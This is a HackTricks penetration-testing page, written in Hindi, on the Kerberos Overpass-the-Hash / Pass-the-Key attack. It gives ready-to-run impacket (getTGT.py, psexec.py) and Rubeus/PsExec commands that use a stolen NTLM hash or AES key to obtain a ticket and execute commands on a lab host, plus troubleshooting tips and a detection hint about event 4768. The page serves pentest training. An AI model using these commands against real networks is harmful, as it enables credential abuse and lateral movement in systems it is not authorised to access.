# Over Pass the Hash/Pass the Key

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** **पालन** करें।
* **हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud)** को PRs सबमिट करके।

</details>

## Overpass The Hash/Pass The Key (PTK)

यह हमला **उपयोगकर्ता NTLM हैश या AES कुंजियों का उपयोग करके Kerberos टिकटें अनुरोध करने** का उद्देश्य रखता है, सामान्य Pass The Hash over NTLM प्रोटोकॉल के बजाय। इसलिए, यह **विशेष रूप से उपयोगी हो सकता है उन नेटवर्कों में जहां NTLM प्रोटोकॉल अक्षम है** और केवल **Kerberos को प्रमाणीकरण प्रोटोकॉल के रूप में स्वीकृत किया गया है**।

इस हमले को कार्यान्वित करने के लिए, **लक्षित उपयोगकर्ता खाते का NTLM हैश (या पासवर्ड) आवश्यक है**। इसलिए, एक उपयोगकर्ता हैश प्राप्त होने के बाद, उस खाते के लिए एक TGT अनुरोध किया जा सकता है। अंततः, यह संभव है कि **किसी भी सेवा या मशीन तक पहुंचा जा सके** जहां उपयोगकर्ता खाते की अनुमति है।
```
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
आप **निर्दिषित** कर सकते हैं `-aesKey [AES कुंजी]` उपयोग करने के लिए **AES256** को निर्दिषित करने के लिए।\
आप टिकट का उपयोग अन्य उपकरणों के साथ भी कर सकते हैं: जैसे smbexec.py या wmiexec.py

संभावित समस्याएं:

* _PyAsn1Error(‘NamedTypes can cast only scalar values’,)_ : अपडेट करके impacket को नवीनतम संस्करण में सुलझाया गया।
* _KDC can’t found the name_ : होस्टनाम का उपयोग करके सुलझाया गया, क्योंकि यह केरबेरोस KDC द्वारा मान्यता प्राप्त नहीं किया गया था।
```
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
यह प्रकार का हमला **पास द की** के लिए समान है, लेकिन हैश का उपयोग करने की बजाय टिकट को चुराया जाता है और इसका उपयोग अपने मालिक के रूप में प्रमाणित करने के लिए किया जाता है।

{% hint style="warning" %}
जब एक टीजीटी का अनुरोध किया जाता है, तो घटना `4768: एक केरबेरोस प्रमाणीकरण टिकट (टीजीटी) का अनुरोध किया गया था` उत्पन्न होती है। आप ऊपर के आउटपुट से देख सकते हैं कि KeyType **RC4-HMAC** (0x17) है, लेकिन Windows के लिए डिफ़ॉल्ट प्रकार अब **AES256** (0x12) है।
{% endhint %}
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## संदर्भ

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का विज्ञापन HackTricks में** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जांच करें!
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या **मुझे** **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud)** को PR जमा करके।

</details>
